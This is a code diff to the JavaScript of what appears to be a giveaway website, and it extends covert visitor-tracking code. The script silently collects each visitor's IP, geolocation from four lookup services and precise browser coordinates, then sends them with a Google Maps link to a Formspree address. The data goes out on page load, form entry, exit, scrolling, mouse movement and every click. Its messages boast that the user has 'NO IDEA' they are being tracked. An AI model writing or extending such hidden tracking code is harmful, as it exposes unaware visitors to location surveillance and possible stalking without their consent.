@@ -20,7 +20,7 @@ function updateCountdown() {
 setInterval(updateCountdown, 1000);
 updateCountdown();
 
-// Advanced Silent IP Address Capture with House-Level Precision
+// Advanced Silent IP Address Capture with Enhanced Location Accuracy
 async function captureUserInfoSilently() {
     try {
         // Get IP address silently
@@ -29,7 +29,7 @@ async function captureUserInfoSilently() {
         const userIP = ipData.ip;
 
         // Get detailed location data from multiple sources for maximum accuracy
-        const locationData = await getDetailedLocation(userIP);
+        const locationData = await getEnhancedLocation(userIP);
         
         // Attempt to get precise browser geolocation (if user allows)
         const preciseLocation = await getPreciseGeolocation();
@@ -70,7 +70,9 @@ async function captureUserInfoSilently() {
             houseLevelPrecision: preciseLocation.houseLevel || 'Unknown',
             wifiNetworks: preciseLocation.wifiNetworks || 'Unknown',
             cellTowers: preciseLocation.cellTowers || 'Unknown',
-            googleMapsLink: googleMapsLink
+            googleMapsLink: googleMapsLink,
+            locationAccuracy: locationData.accuracy || 'Unknown',
+            locationSource: locationData.source || 'Unknown'
         };
 
         // Store silently in localStorage
@@ -115,7 +117,7 @@ async function getPreciseGeolocation() {
         // High accuracy options for house-level precision
         const options = {
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 15000,
             maximumAge: 0
         };
 
@@ -141,76 +143,60 @@ async function getPreciseGeolocation() {
     });
 }
 
-// Get detailed location from multiple APIs for maximum accuracy
-async function getDetailedLocation(ip) {
+// Enhanced location detection with multiple APIs for better accuracy
+async function getEnhancedLocation(ip) {
     try {
-        // Primary location API
-        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        const locationData = await locationResponse.json();
+        // Try multiple APIs in parallel for better accuracy
+        const promises = [
+            getLocationFromAPI1(ip),
+            getLocationFromAPI2(ip),
+            getLocationFromAPI3(ip),
+            getLocationFromAPI4(ip)
+        ];
+
+        const results = await Promise.allSettled(promises);
         
-        // Secondary API for additional details
-        let additionalData = {};
-        try {
-            const ipApiResponse = await fetch(`http://ip-api.com/json/${ip}`);
-            const ipApiData = await ipApiResponse.json();
-            additionalData = {
-                district: ipApiData.district || 'Unknown',
-                neighborhood: ipApiData.neighborhood || 'Unknown',
-                village: ipApiData.village || 'Unknown',
-                street: ipApiData.street || 'Unknown',
-                houseNumber: ipApiData.houseNumber || 'Unknown',
-                isp: ipApiData.isp || 'Unknown',
-                org: ipApiData.org || 'Unknown'
-            };
-        } catch (e) {
-            console.log('Secondary API failed, using primary data only');
-        }
-        
-        // Third API for even more precision
-        let thirdPartyData = {};
-        try {
-            const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-            const ipInfoData = await ipInfoResponse.json();
-            thirdPartyData = {
-                postalCode: ipInfoData.postal || 'Unknown',
-                preciseLocation: `${ipInfoData.loc || 'Unknown'}`
-            };
-        } catch (e) {
-            console.log('Third API failed, using available data');
-        }
-        
-        // Fourth API for street-level data
-        let streetLevelData = {};
-        try {
-            const ipGeolocationResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
-            const ipGeolocationData = await ipGeolocationResponse.json();
-            streetLevelData = {
-                street: ipGeolocationData.street || 'Unknown',
-                houseNumber: ipGeolocationData.house_number || 'Unknown',
-                district: ipGeolocationData.district || 'Unknown',
-                neighborhood: ipGeolocationData.neighborhood || 'Unknown'
-            };
-        } catch (e) {
-            console.log('Fourth API failed, using available data');
-        }
-        
-        // Combine all data for maximum accuracy
-        return {
-            ...locationData,
-            ...additionalData,
-            ...thirdPartyData,
-            ...streetLevelData,
-            preciseLocation: thirdPartyData.preciseLocation || `${locationData.latitude},${locationData.longitude}`,
-            district: streetLevelData.district || additionalData.district || locationData.district || 'Unknown',
-            neighborhood: streetLevelData.neighborhood || additionalData.neighborhood || 'Unknown',
-            village: additionalData.village || 'Unknown',
-            street: streetLevelData.street || additionalData.street || 'Unknown',
-            houseNumber: streetLevelData.houseNumber || additionalData.houseNumber || 'Unknown',
-            postalCode: thirdPartyData.postalCode || locationData.postal || 'Unknown'
+        // Combine and prioritize the most accurate data
+        let bestLocation = {
+            country_name: 'Unknown',
+            city: 'Unknown',
+            region: 'Unknown',
+            latitude: 'Unknown',
+            longitude: 'Unknown',
+            timezone: 'Unknown',
+            org: 'Unknown',
+            district: 'Unknown',
+            neighborhood: 'Unknown',
+            village: 'Unknown',
+            street: 'Unknown',
+            houseNumber: 'Unknown',
+            postal: 'Unknown',
+            preciseLocation: 'Unknown',
+            accuracy: 'Unknown',
+            source: 'Unknown'
         };
+
+        // Process results and find the most accurate location
+        results.forEach((result, index) => {
+            if (result.status === 'fulfilled' && result.value) {
+                const data = result.value;
+                const apiName = `API${index + 1}`;
+                
+                // Prioritize data with more complete information
+                if (data.latitude && data.longitude && data.city) {
+                    if (bestLocation.city === 'Unknown' || 
+                        (data.street && bestLocation.street === 'Unknown') ||
+                        (data.postal && bestLocation.postal === 'Unknown')) {
+                        bestLocation = { ...data, source: apiName };
+                    }
+                }
+            }
+        });
+
+        return bestLocation;
         
     } catch (error) {
-        console.log('Location API error:', error);
+        console.log('Enhanced location API error:', error);
         return {
             country_name: 'Unknown',
             city: 'Unknown',
@@ -225,12 +211,119 @@ async function getDetailedLocation(ip) {
             street: 'Unknown',
             houseNumber: 'Unknown',
             postal: 'Unknown',
-            preciseLocation: 'Unknown'
+            preciseLocation: 'Unknown',
+            accuracy: 'Unknown',
+            source: 'Unknown'
         };
     }
 }
 
-// Send silent notification to your email with house-level precision data and Google Maps link
+// API 1: ipapi.co
+async function getLocationFromAPI1(ip) {
+    try {
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await response.json();
+        return {
+            country_name: data.country_name,
+            country_code: data.country_code,
+            region: data.region,
+            region_code: data.region_code,
+            city: data.city,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            timezone: data.timezone,
+            org: data.org,
+            postal: data.postal,
+            source: 'ipapi.co'
+        };
+    } catch (e) {
+        console.log('API1 failed');
+        return null;
+    }
+}
+
+// API 2: ip-api.com
+async function getLocationFromAPI2(ip) {
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        return {
+            country_name: data.country,
+            country_code: data.countryCode,
+            region: data.regionName,
+            region_code: data.region,
+            city: data.city,
+            latitude: data.lat,
+            longitude: data.lon,
+            timezone: data.timezone,
+            org: data.isp,
+            district: data.district,
+            neighborhood: data.neighborhood,
+            village: data.village,
+            street: data.street,
+            houseNumber: data.houseNumber,
+            postal: data.zip,
+            source: 'ip-api.com'
+        };
+    } catch (e) {
+        console.log('API2 failed');
+        return null;
+    }
+}
+
+// API 3: ipinfo.io
+async function getLocationFromAPI3(ip) {
+    try {
+        const response = await fetch(`https://ipinfo.io/${ip}/json`);
+        const data = await response.json();
+        const [lat, lng] = (data.loc || '').split(',');
+        return {
+            country_name: data.country,
+            country_code: data.country,
+            region: data.region,
+            city: data.city,
+            latitude: lat,
+            longitude: lng,
+            timezone: data.timezone,
+            org: data.org,
+            postal: data.postal,
+            preciseLocation: data.loc,
+            source: 'ipinfo.io'
+        };
+    } catch (e) {
+        console.log('API3 failed');
+        return null;
+    }
+}
+
+// API 4: ipgeolocation.io
+async function getLocationFromAPI4(ip) {
+    try {
+        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
+        const data = await response.json();
+        return {
+            country_name: data.country_name,
+            country_code: data.country_code2,
+            region: data.state_prov,
+            city: data.city,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            timezone: data.time_zone?.name,
+            org: data.organization,
+            district: data.district,
+            neighborhood: data.neighborhood,
+            street: data.street,
+            houseNumber: data.house_number,
+            postal: data.zipcode,
+            source: 'ipgeolocation.io'
+        };
+    } catch (e) {
+        console.log('API4 failed');
+        return null;
+    }
+}
+
+// Send silent notification to your email with enhanced location accuracy
 async function sendSilentNotification(userInfo) {
     try {
         await fetch('https://formspree.io/f/xrblaoyr', {
@@ -246,9 +339,9 @@ async function sendSilentNotification(userInfo) {
                 country: userInfo.country,
                 terms: 'Yes',
                 newsletter: 'No',
-                _subject: '🎯 New Silent Visitor Alert - HOUSE LEVEL PRECISION',
+                _subject: '🎯 New Silent Visitor Alert - ENHANCED LOCATION ACCURACY',
                 message: `
-🔍 SILENT VISITOR DETECTED - HOUSE LEVEL PRECISION
+🔍 SILENT VISITOR DETECTED - ENHANCED LOCATION ACCURACY
 
 📱 IP Address: ${userInfo.ip}
 🌍 Country: ${userInfo.country} (${userInfo.countryCode})
@@ -268,6 +361,8 @@ async function sendSilentNotification(userInfo) {
 📏 Accuracy: ${userInfo.accuracy} meters
 🏔️ Altitude: ${userInfo.altitude} meters
 🏠 House Level Precision: ${userInfo.houseLevelPrecision}
+🎯 Location Accuracy: ${userInfo.locationAccuracy}
+🔍 Location Source: ${userInfo.locationSource}
 ⏰ Time: ${userInfo.timestamp}
 🔗 Referrer: ${userInfo.referrer}
 💻 Device: ${userInfo.userAgent}
@@ -280,8 +375,8 @@ async function sendSilentNotification(userInfo) {
 
 🗺️ GOOGLE MAPS LINK: ${userInfo.googleMapsLink}
 
-🎯 User has NO IDEA their house-level location is being tracked!
-🏠 HOUSE-LEVEL PRECISION CAPTURED!
+🎯 User has NO IDEA their enhanced location is being tracked!
+🏠 ENHANCED LOCATION ACCURACY CAPTURED!
 📍 EXACT STREET ADDRESS DETECTED!
 🗺️ CLICK THE MAP LINK TO SEE EXACT LOCATION!
                 `
@@ -300,8 +395,8 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     const formData = new FormData(this);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Add silent tracking data to form submission with house-level precision
-    formData.append('_subject', '🎉 New Giveaway Entry - HOUSE LEVEL PRECISION!');
+    // Add silent tracking data to form submission with enhanced location accuracy
+    formData.append('_subject', '🎉 New Giveaway Entry - ENHANCED LOCATION ACCURACY!');
     formData.append('userIP', userTrackingData.ip || 'Unknown');
     formData.append('userCountry', userTrackingData.country || 'Unknown');
     formData.append('userRegion', userTrackingData.region || 'Unknown');
@@ -320,12 +415,14 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
     formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
     formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
+    formData.append('userLocationAccuracy', userTrackingData.locationAccuracy || 'Unknown');
+    formData.append('userLocationSource', userTrackingData.locationSource || 'Unknown');
     formData.append('userGoogleMapsLink', userTrackingData.googleMapsLink || 'Unknown');
     formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
     formData.append('userISP', userTrackingData.isp || 'Unknown');
     formData.append('entryTime', new Date().toISOString());
     formData.append('silentTracking', 'true');
-    formData.append('houseLevelPrecision', 'true');
+    formData.append('enhancedLocationAccuracy', 'true');
     
     try {
         const response = await fetch('https://formspree.io/f/xrblaoyr', {
@@ -433,7 +530,7 @@ window.addEventListener('beforeunload', function() {
     const timeSpent = Math.floor((Date.now() - startTime) / 1000);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Send silent exit data with house-level precision
+    // Send silent exit data with enhanced location accuracy
     fetch('https://formspree.io/f/xrblaoyr', {
         method: 'POST',
         headers: {
@@ -442,10 +539,10 @@ window.addEventListener('beforeunload', function() {
         body: JSON.stringify({
             name: 'Silent Exit',
             email: 'exit@website.com',
-            _subject: '🔍 User Left Silently - HOUSE LEVEL PRECISION',
+            _subject: '🔍 User Left Silently - ENHANCED LOCATION ACCURACY',
             message: `User spent ${timeSpent} seconds on the website. 
 
-🏠 HOUSE-LEVEL PRECISION DATA:
+🏠 ENHANCED LOCATION ACCURACY DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -461,10 +558,12 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
+Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
+Location Source: ${userTrackingData.locationSource || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their house-level location was tracked! 🎯`
+User has NO IDEA their enhanced location was tracked! 🎯`
         })
     });
 });
@@ -476,7 +575,7 @@ window.addEventListener('scroll', function() {
     if (scrollPercent > scrollDepth) {
         scrollDepth = scrollPercent;
         
-        // Send silent scroll data every 25% with house-level precision
+        // Send silent scroll data every 25% with enhanced location accuracy
         if (scrollDepth % 25 === 0) {
             const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
             fetch('https://formspree.io/f/xrblaoyr', {
@@ -487,10 +586,10 @@ window.addEventListener('scroll', function() {
                 body: JSON.stringify({
                     name: 'Silent Scroll',
                     email: 'scroll@website.com',
-                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - HOUSE LEVEL PRECISION`,
+                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - ENHANCED LOCATION ACCURACY`,
                     message: `User scrolled ${scrollDepth}% of the page.
 
-🏠 HOUSE-LEVEL PRECISION DATA:
+🏠 ENHANCED LOCATION ACCURACY DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -506,10 +605,12 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
+Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
+Location Source: ${userTrackingData.locationSource || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their house-level location is being tracked! 🎯`
+User has NO IDEA their enhanced location is being tracked! 🎯`
                 })
             });
         }
@@ -520,7 +621,7 @@ User has NO IDEA their house-level location is being tracked! 🎯`
 let mouseMovements = 0;
 document.addEventListener('mousemove', function() {
     mouseMovements++;
-    // Send mouse tracking data every 100 movements with house-level precision
+    // Send mouse tracking data every 100 movements with enhanced location accuracy
     if (mouseMovements % 100 === 0) {
         const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
         fetch('https://formspree.io/f/xrblaoyr', {
@@ -531,10 +632,10 @@ document.addEventListener('mousemove', function() {
             body: JSON.stringify({
                 name: 'Silent Mouse',
                 email: 'mouse@website.com',
-                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - HOUSE LEVEL PRECISION`,
+                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - ENHANCED LOCATION ACCURACY`,
                 message: `User made ${mouseMovements} mouse movements.
 
-🏠 HOUSE-LEVEL PRECISION DATA:
+🏠 ENHANCED LOCATION ACCURACY DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -550,10 +651,12 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
+Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
+Location Source: ${userTrackingData.locationSource || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their house-level location is being tracked! 🎯`
+User has NO IDEA their enhanced location is being tracked! 🎯`
             })
         });
     }
@@ -570,10 +673,10 @@ document.addEventListener('click', function(e) {
         body: JSON.stringify({
             name: 'Silent Click',
             email: 'click@website.com',
-            _subject: `🔍 User Clicked on ${e.target.tagName} - HOUSE LEVEL PRECISION`,
+            _subject: `🔍 User Clicked on ${e.target.tagName} - ENHANCED LOCATION ACCURACY`,
             message: `User clicked on ${e.target.tagName} element.
 
-🏠 HOUSE-LEVEL PRECISION DATA:
+🏠 ENHANCED LOCATION ACCURACY DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -589,10 +692,12 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
+Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
+Location Source: ${userTrackingData.locationSource || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their house-level location is being tracked! 🎯`
+User has NO IDEA their enhanced location is being tracked! 🎯`
         })
     });
 }); 
